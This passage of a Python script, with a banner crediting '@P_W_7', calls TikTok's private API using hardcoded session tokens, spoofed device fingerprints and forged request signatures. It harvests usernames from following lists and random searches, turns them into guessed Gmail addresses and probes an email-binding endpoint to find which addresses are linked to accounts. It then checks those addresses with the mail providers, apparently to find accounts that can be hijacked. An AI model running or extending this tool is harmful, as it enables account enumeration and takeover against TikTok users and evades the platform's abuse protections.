  "ssmix": "a",
      '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
    'cdid': str(uuid.uuid4()),
  "channel": "googleplay",
  "aid": "1233",
  "app_name": "musical_ly",
  "version_code": "360505",
  "version_name": "36.5.5",
  "manifest_version_code": "2023605050",
  "update_version_code": "2023605050",
  "ab_version": "36.5.5",
  "resolution": "1440*2969",
  "dpi": "532",
  "device_type": "SM-S928B",
  "device_brand": "samsung",
  "language": "EN",
  "os_api": "34",
  "os_version": "14",
  "ac": "wifi",
  "is_pad": "0",
  "current_region": "US",
  "app_type": "normal",
  "sys_region": "US",
  "last_install_time": "1729289943",
  "mcc_mnc": "41820",
  "timezone_name": "Asia/Baghdad",
  "carrier_region_v2": "418",
  "residence": "US",
  "app_language": "en",
  "carrier_region": "US",
  "timezone_offset": "10800",
  "host_abi": "arm64-v8a",
  "locale": "ar",
  "ac2": "wifi",
  "uoo": "0",
  "op_region": "US",
  "build_number": "36.5.5",
  "region": "US",
  'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
    'iid': str(random.randint(1, 10**19)),
    'device_id': str(random.randint(1, 10**19)),
    #'openudid': str(binascii.hexlify(os.urandom(8)).decode()),

  "support_webview": "1",
  "cronet_version": "1c651b66_2024-08-30",
  "ttnet_version": "4.2.195.8-tiktok",
  "use_store_region_cookie": "1"
}

	m=sign(params=urlencode(params),payload="",cookie="")
	
	url =f'https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&'
	headers = {
    'X-Tt-Token': '03528f398cb8e5c4848aebd04ab972f3440487154673110bacbcc2a73c94d0c9c11095cbe18c05d8d7bae184f972f3e16d1e27d19c96ae669a28b7e69f51424b93a0c717adb41176798319a3d3d3b8742923871f07de70b71920e20ff8c0c09b40b19-CkA5ZTZiMzIxNGY3OGU0ZDU0OWMwY2I3NTQwMjBmN2JlOGExMTRkODNhY2QwMjI3ZDQ3NDc1Y2Y5ZDZhMmVlOGNi-2.0.0',
    'sdk-version': '1',
    'x-ss-dp': '1233',
    'x-tt-trace-id': '00-deb4845f1062c1cf916902c6058604d1-deb4845f1062c1cf-01',
    'user-agent': 'com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)',
  #  'x-khronos': '1726018257',
#    'x-gorgon': '0300a0ab0400e143851ec41bc8a831e228c0be0a2195099097f1',
#  'x-common-params-v2': f'manifest_version_code=2021306050&app_language=ar&app_type=normal&iid={idg}&channel=googleplay&device_type=ANY-LX2&language=ar&locale=ar&resolution=1080*2298&openudid=36dd31864f68ff6f&update_version_code=2021306050&ac2=wifi&sys_region=IQ&os_api=33&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&carrier_region=IQ&ac=wifi&device_id={idg}&pass-route=1&os_version=13&timezone_offset=10800&version_code=130605&app_name=musical_ly&ab_version=13.6.5&version_name=13.6.5&device_brand=HONOR&ssmix=a&pass-region=1&device_platform=android&build_number=13.6.5&region=ar&aid=1233',
  'x-argus': m["x-argus"],  'x-gorgon':m["x-gorgon"],'x-khronos': m["x-khronos"],'x-ladon':m["x-ladon"],
}
	data = {
"account_sdk_source": "app",
"multi_login": "1",
"email_source": "9",
"email": email,
"mix_mode": "1"
            }
	res = requests.post(url,headers=headers,data=data,params=params).text
	print(res)	
	if 'Email is linked to another account. Unlink or try another email.' in res:
		os.system('clear')
		ya+=1
		if '@gmail.com' in email:
			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			check_gmail(email)
		else:
			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Hotmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Hotmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
			check_hotmail(email)
	else:
		os.system('clear')
		no+=1
		if '@gmail.com' in email:
			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
		else:
			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Hotmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Hotmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')

def userzaid():
	au=[]
	try:
		ada = int(input(f'{S}∆ - Write Numper User : '))
		print('')
		print(f'{B}═════════════════════════════')
	except ValueError:
		print(f'{S} Error Input :) ')
	if ada<1:
		print(f'{S} Error Input :) ')
	for met in range(ada):
		us = input(f'{S}{met} - Write User Tiktok : ')
		print('')
		print(f'{B}═════════════════════════════')
		au.append(us)
	for user in au:
		try:
			headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
            }
			g = requests.get(f'https://www.tiktok.com/@{user}', headers=headers).text
			inf = str(g.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
			ud = str(inf.split('id":"')[1]).split('",')[0]
			print(f'>ID Your Account : {E}{ud}')
		except:
				os.system('clear')
				print(f'Error User : {user}')
				continue
		uid = "".join(random.choice('1234567890')for i in range(18))
		url = f'https://api16-normal-c-alisg.tiktokv.com/aweme/v1/user/following/list/?user_id={ud}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&_rticket=1730829325733&mcc_mnc=41805&carrier_region_v2=418&ts=1730829323&sec_user_id={user}&';he = {
    'Host': 'api16-normal-c-alisg.tiktokv.com',
    'x-tt-token': '03492198ec600b15d19d6efac692966a710090aafebfa4f45d16114089eb0b1b83c6b162948ec03dee14986dac10598f902699205853d24e35bf9bfbe632b30d472d823bab52a9a192876ff034fd964ca1f44cf993c9af9ba3d841169bc9e7a4b1062-CkAyNzAyNmM1MzU0ZTM1Nzc2M2MxZDRlOGY3YTgzMTE0NGQ3M2NiMTA1MThhNmE4ZGMwYTU1Mjc3MTgxMmQ0N2Fi-2.0.0',
    'sdk-version': '1',
    'x-ss-dp': '1233',
    'x-tt-trace-id': '00-fd7797581062c1cf916902c605c404d1-fd7797581062c1cf-01',
    'user-agent': 'com.zhiliaoapp.musically/2021306050 (Linux; U; Android 13; ar_IQ_#u-nu-latn; ANY-LX2; Build/HONORANY-L22CQ; Cronet/TTNetVersion:57844a4b 2019-10-16)',
    'x-khronos': '1730829325',
    'x-gorgon': '0300f0e1040018497903e96d332ec88aa707649b33f5f150e468',
    'x-common-params-v2': 'manifest_version_code=2021306050&current_region=IQ&app_language=ar&app_type=normal&iid=7433854362012681989&channel=googleplay&device_type=ANY-LX2&language=ar&locale=ar&resolution=1080*2298&openudid=39e9b96bb5c6e336&update_version_code=2021306050&ac2=wifi&sys_region=IQ&os_api=33&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=480&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7116197109661091333&pass-route=1&os_version=13&timezone_offset=10800&version_code=130605&app_name=musical_ly&ab_version=13.6.5&version_name=13.6.5&device_brand=HONOR&ssmix=a&pass-region=1&device_platform=android&build_number=13.6.5&region=ar&aid=1233',
}
		re = requests.get(url,headers=he).json()
		zz=0
		try:
			while True:
				zz+=1
				us=(re['followings'][zz]['unique_id'])
				if '_' in user:
					continue
				email=us+"@gmail.com"
				chzm(email)
		except:
				pass				


def rrandom():
        while True:
            try:
                g=choice(
            [
                'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',  
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
                
'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',                'abcdefghijklmnopqrstuvwxyzñ',  
                'abcdefghijklmnopqrstuvwxyzñ',
                'abcdefghijklmnopqrstuvwxyzñ',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',  
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                'абвгдеёжзийклмнопрстуфхцчшщъыьэюя',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',  
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                '的一是不了人我在有他这为之大来以个中上们到说时国和地要就出会可也你对生能而子那得于着下自之',
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',  
                'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん', 
                'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'אבגדהוזחטיכלמנסעפצקרשת',
                'αβγδεζηθικλμνξοπρστυφχψω',  
                'αβγδεζηθικλμνξοπρστυφχψω',
                'abcdefghijklmnopqrstuvwxyzç', 
                'abcdefghijklmnopqrstuvwxyzç',
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',  
                'กขฃคฅฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรฤฤลฦวศษสหฬอฮ',
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
                'अआइईउऊऋएऐओऔअंअःकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',
            ]

        )
                keyword=''.join((choice(g) for i in range(randrange(3,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))

                #ttwid=requests.get('https://api.douyin.wtf/api/douyin/web/generate_ttwid').json()['data']['ttwid']
                #msToken=requests.get('https://api.douyin.wtf/api/douyin/web/generate_real_msToken').json()['data']['msToken']#                  
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
                zaid = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = zaid.cookies.get_dict()['msToken']
                #print(ttwid)
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': he3["User-Agent"],
                }
                params = {
                    'WebIdLastTime': '1715883147',
                    'aid': '1988',
                    'app_language': 'en',
                    'app_name': 'tiktok_web',
                    'browser_language': 'en-US',
                    'browser_name': 'Mozilla',
                    'browser_online': 'true',
                    'browser_platform': 'Win32',
                    'browser_version': he3["User-Agent"],
                    'channel': 'tiktok_web',
                    'cookie_enabled': 'true',
                    'cursor': '200',
                    'data_collection_enabled': 'false',
                    'device_id': idd6,
                    'device_platform': 'web_pc',
                    'focus_state': 'true',
                    'from_page': 'search',
                    'history_len': '5',
                    'is_fullscreen': 'false',
                    'is_page_visible': 'true',
                    'keyword': f'{keyword}',
                    'odinId': '7369661640164000774',
                    'os': 'windows',
                    'priority_region': '',
                    'referer': '',
                   'region': random.choice(["MA", "US", "CA", "FR", "DE","IQ","IQ","IQ"]),
                    'screen_height': '864',
                    'screen_width': '1536',
                    'search_id': '20240801154310BA7846F9CDEDD312B464',
                    'tz_name': 'Asia/Baghdad',
                    'user_is_login': 'false',
                    'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
                    'webcast_language': 'en',
                   'msToken': msToken,
                    'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD',
                    '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
                }

                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                	response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()
                	#print(response)
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    fol =(users['user_info']['follower_count'])
                    if '_' in user:
                    	continue
                    email=user+"@gmail.com"
                    chzm(email)                  
            except:print('Waiting')


def zaidrandom():
        while True:
            try:
                g=choice(
            [
'azertyuiopmlkjhgfdsqwxcvbn', 
                'azertyuiopmlkjhgfdsqwxcvbn',
                'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
 'abcdefghijklmnopqrstuvwxyzéèêëàâäôùûüîïç',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
 'ğüişöçñäüğüişöçñäüğüişöçñäü',
'abcdefghijklmnopqrstuvwxyzç',
'abcdefghijklmnopqrstuvwxyzç',
                
            ]

        )
                keyword=''.join((choice(g) for i in range(randrange(4,9))))
                idd6= "".join(random.choice('1234567890')for i in range(19))

                #ttwid=requests.get('https://api.douyin.wtf/api/douyin/web/generate_ttwid').json()['data']['ttwid']
                #msToken=requests.get('https://api.douyin.wtf/api/douyin/web/generate_real_msToken').json()['data']['msToken']#                  
                he3 = {"User-Agent": f'com.zhiliaoapp.musically/{keyword} (Linux; U; Android {randrange(7,13)}; ar_IQ_#u-nu-latn; ANY-LX2; Build/{keyword}; Cronet/58.0.{randrange(3,9)}.0)'}
                ttwid=requests.get('https://www.tiktok.com/',headers=he3).cookies.get_dict()['ttwid']
                zaid = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=0.84&browser_language=ar-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=zaid&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Asia%2FBaghdad&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=ar&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = zaid.cookies.get_dict()['msToken']
                print(ttwid)
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'no-cache',
                    'pragma': 'no-cache',
                    'priority': 'u=1, i',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': he3["User-Agent"],
                }


                params = {
                    'WebIdLastTime': '1715883147',
                    'aid': '1988',
                    'app_language': 'en',
                    'app_name': 'tiktok_web',
                    'browser_language': 'en-US',
                    'browser_name': 'Mozilla',
                    'browser_online': 'true',
                    'browser_platform': 'Win32',
                    'browser_version': he3["User-Agent"],
                    'channel': 'tiktok_web',
                    'cookie_enabled': 'true',
                   'cursor': '250',
                    'data_collection_enabled': 'false',
                    'device_id': idd6,
                    'device_platform': 'web_pc',
                    'focus_state': 'true',
                    'from_page': 'search',
                    'history_len': '5',
                    'is_fullscreen': 'false',
                    'is_page_visible': 'true',
                    'keyword': f'{keyword}',
                    'odinId': '7369661640164000774',
                    'os': 'windows',
                    'priority_region': '',
                    'referer': '',
                   'region': 'PE',
                    'screen_height': '864',
                    'screen_width': '1536',
                    'search_id': '20240801154310BA7846F9CDEDD312B464',
                    'tz_name': 'Asia/Baghdad',
                    'user_is_login': 'false',
                    'web_search_code': '{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}',
                    'webcast_language': 'en',
                   'msToken': msToken,
                    'X-Bogus': 'DFSzswVLRekANHWvtvtx-ShPmkfD',
                    '_signature': '_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70',
                }

                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; 